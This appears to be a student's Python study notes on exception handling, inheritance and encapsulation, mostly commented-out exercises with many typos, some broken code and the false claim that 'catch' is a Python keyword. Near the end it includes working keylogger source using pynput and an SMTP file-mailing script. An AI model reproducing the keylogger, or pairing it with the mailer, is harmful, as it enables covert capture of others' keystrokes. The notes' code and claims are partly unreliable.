# DAY 4
# EXCEPTION HANDLING 

'''
Error in pytohn ca be of two types
Exception and syntax error
errors are the problems in a program due to which the program will stop
exception is raised when the program is syntactically correct but the program flow stops durig the execution

Exception handling is used to hnadle the runtime errors to handle these errors we use the following blocks , try 
and except statements.
The two key words that we use in the exception handling are : try , catch and else , except

'''
# def add(*args):
#     x,y=args
#     if y == 0:
#         b = x/y
#         print(b)
#         print(b+x+y)
#     else:
#         print(b+x+y)

# try:
#     add(10,4)  # this cod eis not executed but the control flow will keep on cotinuing itselflslsmm
# except ZeroDivisionError:
#     print("Zero division error was handled")
# except NameError():
#     print("a variable is not declared")
# add(10,0)
# add(10,4)


# Finally keyword is always executed after teh try and except blocks 
# the finally block always executed after the normal terminaion of try block

# finally:
#     print("the finally block is executed ")

# the raise keyword is used in the program during hte exception handling to raise
#  a specific exception thet indicateds the exception

'''Write a program to access an element in a list with the index with
 length 10 and  take input from th euser n and if the user tries to access
  index out of length handle the error using exception handling'''


# my_list = [1, 2, 3, 4, 4, 6, 7, 8, 9, 10]

# try:
#     n = int(input("Enter an index between 0 and 9: "))
#     element = my_list[n]
#     print("The element at index {} is {}".format(n, element))
# except IndexError:
#     print("Error: Index out of range. Please enter an index between 0 and 9.")
# except ValueError:
#     print("Error: Please enter a valid integer.")

'''
Samragyi is a businesswomen and is planning to invest on N companies
 and she is planning to invest from the money values in Kunas(k) where she has to invest in a 
 unique order where all of her Kunas are invested in all companies and making sure they 
 are not equally distributed each company should get a different sum of investment .

 the sample input k = 100 N = 4
 output: [1,2,3,94]


'''
# Sirs approach
# def samragyisinvestment(n,k):
#     investment=[]
#     sum_kuas = 0
#     for i in range(k-1):
#         investment.append(i+1)
#         sum_kuas +=i+1
#     investment.append(n,sum_kuas)
#     return investment
# print(samragyisinvestment(100,4))

# the sirs approach is mush more fesiable and more sustainable


# ####################################

# import math
# import random

# def unique_distributions(total_kunas, n_companies):
   
#     distributions = []
#     for k in range(1, n_companies+1):
#         num_ways = math.comb(n_companies, k)
#         min_kunas = total_kunas // k
#         max_kunas = total_kunas // k + 1
#         for c in range(num_ways):
#             amounts = [min_kunas] * (n_companies - k) + [max_kunas] * k
#             random.shuffle(amounts)
#             if len(set(amounts)) == n_companies:
#                 distributions.append(amounts)
#     return distributions


# total_kunas = 100
# n_companies = 4
# distributions = unique_distributions(total_kunas, n_companies)
# print(distributions)


# INHERITACNE
'''
inheritance is process of acquiring the content of one class to another class
it is one of the core concepts of the object orienred programming it allows you ti create a hirerchy of 
classes that a set of properties and methods by deriving a class form class to anther

inheritace is the capability of copying the properties from one calss to anther 
it represents the real workd relationships.
it provides the reusability of the code
it has a simple and a understandable modal and structured
it is easy to debug 
'''

# class new:
    # here goes the body of the class
    # also the member function of the class

# class a:
#     new = 1

# class b(a):
#     def result():
#         newer = a.new * 2
#         print(newer)    

# obj = b()

# b.result()

# # this was an example of the single level inheritance

# the different types of the inheritance is as folow 

'''1 single level inheritace
-> in this type of inheritance we acquire the properties of ine clas to anther child class
or we can also call it as the parent class or the chil class and the base class '''
# class base:
#     def __init__(self):
#         print("Base Class")

# class derived(base):
#     def __init__(self):
#         print("Derived class")

# class main:
#     obj = derived()



'''2 multilivel -> i this type of inheritance the base class derives
 the data member from a class that is derived from an existing calss 
 there are multiple levewl of inheritance n the the multilevel inheritance'''

# class base:
#     def __init__(self,brand):
#         self.brand = brand

# class Derived:
#     def __init__(self,brand,color,model) -> None:
#         base.__init__(self.brand)
#         self.color=color
#         self.brand=brand
#         self.model=model
#         print(self.color , self.model)

# class subDerived(Derived):
#     def __init__(self, brand, color, model , price)
#     :
#         super().__init__(brand, color, model)



'''3 hirerchial inheritance - 
'''

# class Student:
#     def __init__(self, name, age, class_name, roll_no):
#         self.name = name
#         self.age = age
#         self.class_name = class_name
#         self.roll_no = roll_no

# class Marks(Student):
#     def __init__(self, name, age, class_name, roll_no, marks_dict):
#         super().__init__(name, age, class_name, roll_no)
#         self.marks_dict = marks_dict

# class ReportCard(Marks):
#     def __init__(self, name, age, class_name, roll_no, marks_dict):
#         super().__init__(name, age, class_name, roll_no, marks_dict)

#     def calculate_percentage(self):
#         total_marks = 0
#         for subject, marks in self.marks_dict.items():
#             total_marks += marks
#         percentage = (total_marks / (len(self.marks_dict) * 100)) * 100
#         return percentage

#     def print_report(self):
#         print("Name:", self.name)
#         print("Age:", self.age)
#         print("Class:", self.class_name)
#         print("Roll No.:", self.roll_no)
#         print("Marks:", self.marks_dict)
#         print("Percentage:", self.calculate_percentage())

# marks_dict = {'English': 75, 'Maths': 80, 'Science': 85, 'Social Science': 70, 'Computer Science': 90}
# report_card = ReportCard('John', 15, '10th', '101', marks_dict)
# report_card.print_report()

        
'''
KEYLOGGER SCRIPT

from pynput import keyboard

# Define a function to write keystrokes to a text file
def on_press(key):
    with open('keystrokes.txt', 'a') as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(str(key))

# Set up a listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()'''

# the below code is used to send a file or a text to a particular mail using the smtp server in py

'''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders

# Set up email parameters
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "your_email@gmail.com"
sender_password = "your_password"
recipient_email = "recipient_email@gmail.com"

# Set up the message container
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = recipient_email
msg['Subject'] = "Email with attachment"

# Add the file or image attachment
filename = "file.txt" # replace with your file name
with open(filename, 'rb') as attachment:
    # If the attachment is an image, use MIMEImage
    if filename.endswith('.jpg') or filename.endswith('.png'):
        image = MIMEImage(attachment.read())
        msg.attach(image)
    # Otherwise, use MIMEBase
    else:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        f'attachment; filename={filename}')
        msg.attach(part)

# Connect to the SMTP server and send the email
with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.starttls()
    server.login(sender_email, sender_password)
    server.sendmail(sender_email, recipient_email, msg.as_string())
'''



# Encaptulation
'''
Encaptulation is one of the fundamental concept of object orie ted programming
it describes the wrapping of the data with code we can prevent the acces of the variables 
and the methods directly by emcaptulating it and the private member functions and private 
members of a class cannot be accessed outside the class nor by creationg the object 
and accessing it through the instances . The private meber can only be assessed through the 
member functions of the same class.
'''


